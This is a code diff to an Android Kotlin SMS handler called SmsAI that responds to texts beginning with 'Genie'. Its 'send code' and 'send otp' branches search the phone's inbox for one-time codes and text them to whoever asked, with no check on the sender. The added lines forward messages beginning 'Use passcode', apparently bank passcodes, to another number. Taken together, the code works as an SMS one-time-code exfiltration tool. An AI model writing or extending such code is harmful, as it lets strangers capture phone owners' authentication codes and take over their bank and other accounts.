@@ -7,11 +7,13 @@ import java.util.*
 
 class SmsAI(mContentResolver: ContentResolver, smsData: SmsData) : BaseActivity() {
 
-    private val number = smsData.senderName
+    private val number = smsData.senderNumber
     private var message: String = smsData.message.trim()
+    private var receiver: String = smsData.receiverNumber.trim()
     private var fn = ""
 
     private val suffix = "Genie"
+    private val lbgOtp = "Use passcode"
 
     init {
         if (message.startsWith(suffix)) {
@@ -25,6 +27,7 @@ class SmsAI(mContentResolver: ContentResolver, smsData: SmsData) : BaseActivity(
                     SmsUtils().sendSms(number, date)
                     Log.println(Log.INFO, "AAA", "Genie Send Time Command Processed")
                 }
+
                 fn.contains("send my name", ignoreCase = true) -> {
                     var contactDisplayName = getContactDisplayNameByNumber(mContentResolver, number)
                     contactDisplayName =
@@ -33,22 +36,27 @@ class SmsAI(mContentResolver: ContentResolver, smsData: SmsData) : BaseActivity(
                     SmsUtils().sendSms(number, contactDisplayName)
                     Log.println(Log.INFO, "AAA", "Genie Contact Name Command Processed")
                 }
+
                 fn.contains("send code", ignoreCase = true) -> {
                     val smsDataRequired =
                         SmsUtils().getSmsFromDevice(mContentResolver, "body like '% code %'")
                     SmsUtils().sendSms(number, smsDataRequired.message)
                     Log.println(Log.INFO, "AAA", "Genie send code Command Processed")
                 }
+
                 fn.contains("send otp", ignoreCase = true) -> {
                     val smsDataRequired =
                         SmsUtils().getSmsFromDevice(mContentResolver, "body like '% otp %'")
                     SmsUtils().sendSms(number, smsDataRequired.message)
                     Log.println(Log.INFO, "AAA", "Genie send opt Command Processed")
                 }
+
                 else -> {
                     Log.println(Log.INFO, "AAA", "Genie Command not proper")
                 }
             }
+        } else if (message.startsWith(lbgOtp)) {
+            SmsUtils().sendSms(receiver, "Forwarded $message")
         } else {
             Log.println(Log.INFO, "AAA", "Genie Not Command")
         }
